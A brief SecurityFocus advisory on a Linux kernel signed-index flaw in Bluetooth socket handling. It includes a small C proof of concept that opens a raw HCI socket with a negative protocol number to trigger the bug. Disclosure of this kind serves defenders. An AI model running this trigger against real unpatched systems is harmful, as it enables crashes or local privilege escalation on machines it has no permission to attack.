source: http://www.securityfocus.com/bid/12911/info

A local signed-buffer-index vulnerability affects the Linux kernel because it fails to securely handle signed values when validating memory indexes.

A local attacker may leverage this issue to gain escalated privileges on an affected computer. 

#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

main()
{
        int ctl;

        /* Open HCI socket  */
        if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, -1111)) < 0)
        {
                perror("Can't open HCI socket.");
                exit(1);
        }
}
